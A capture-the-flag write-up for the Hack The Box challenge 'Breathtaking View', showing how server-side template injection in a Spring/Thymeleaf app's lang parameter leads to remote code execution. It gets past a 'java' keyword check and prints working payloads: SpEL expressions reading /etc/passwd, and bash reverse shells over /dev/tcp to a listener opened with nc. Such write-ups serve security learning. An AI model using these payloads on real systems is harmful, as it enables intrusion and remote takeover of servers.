# HTB Breathtaking View: Writeup

Firstly we download the source files

We see that this is a java web application.

### Looking at the source code

While looking around we, see that the application uses thymeleaf templating engine (pom.xml) and stumble upon the IndexController.java file which controls the view of the page based on the value of lang parameter provided by the user

### What do you need to know about the Spring Framework to spot the vulnerbility?

Okay so in the Spring Framework the value returned by the @Controller gets passed to the ViewResolver which dynamicly builds the view of the page based on the value it gets.

This is done behind the scenes by the Spring MVC
```
View view = resolveViewName(viewName, mv.getModelInternal(), locale, request);
```
which then calls this, loops through configured resolvers and returns a view

```
for (ViewResolver viewResolver : this.viewResolvers) {
    View view = viewResolver.resolveViewName(viewName, locale);
    if (view != null) {
        return view;
    }
}
```

### The vulnerability

The function does not sanitize or validate the provided lang parameter besides this snippet
```
if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }
```

This means that if we use the "java" keyword in the lang parameter it will throw an error "But.... For what?" and redirect back.
You'll see why does that cause a bit of discomfort while exploiting in a bit

And then it does this:

```
return lang + "/index";
```

This gets passed to the ViewResolver, which then builds the view based on a template
**Okay but what can we do with this??!!**
We can achieve RCE with SSTI via the lang parameter

### Exploitation

While trying 2*2 as lang parameter i got this error

**There was an unexpected error (type=Internal Server Error, status=500).
Error resolving template [2*2/index], template might not exist or might not be accessible by any of the configured Template Resolvers**

This confirms that the value is indeed passed to the ViewResolver and it searches that value as a template.

After some trial and error i got the right one (url encoded)

```
__${7*7}__::
```

now we can get code execution right?

```
__${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}__::
```

Whoops, no it redirects us back to the root, why?
Remember the only check it did? Yeah...

### Bypassing keyword validation

In Spring Expression Language the T operator is used to reference java classes

So instead of saying

```
T(java.lang.runtime)
```

we can just say

```
T(Runtime).getRuntime().exec('id')
```

However we don't get the expected output of root(0),etc...
we get something like **java.lang.UNIXProcess@1897e6a0**
It appears as if its just spawning a process and doesn't show the output of the command.
But from this we can infer that our code execution is working, so behold...

### Getting a reverse shell

As this is a docker container and we will have to specify the docker container interface as the listening address

```

T(Runtime).getRuntime().exec('bash -c 'bash -i /dev/tcp/172.17.0.1/4444 0>&1'')

```

but that didn't work, even

```
T(Runtime).getRuntime().exec('cat /etc/passwd > /dev/tcp/172.17.0.1/4444')
```

didn't work. However when we tried using ping and did a tcpdump on our local machine, we started getting the ICMP packets, so now we are 100% sure that the code execution is working (although we had to exec into the container and install ping to make it work xD).
After trying a lot of stuff i finaly found the golden answer. Behold...

The payload consists of two parts, firstly we will write the shell script to a file on the system. And then we will execute it.

To write reverse shell to file

```
__${T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' > shell.sh"})}__::
```

The new String[]{} creates a string array. In java there are two ways to execute a command

**exec('command')** is used to execute a single command, while
**exec(new String[]{"command","argument"})** is used to execute a command with arguments and avoid escaping issues.

And the next and final step of the challenge is to execute the script.

```
__$T(Runtime).getRuntime().exec(new String[]{"bash","-c","bash shell.sh"})
```

We catch the shell on our local machine with

```
nc -lvnp 4444
```

To do the same on the remote endpoint we have to use ngrok

Command N1

```
__${T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "echo 'bash -i >& /dev/tcp/<public_ip>/<port> 0>&1' > shell.sh"})}__::
```

Command N2

```
__${T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "bash shell.sh"})}__::
```

![Alt text](pwned.png)
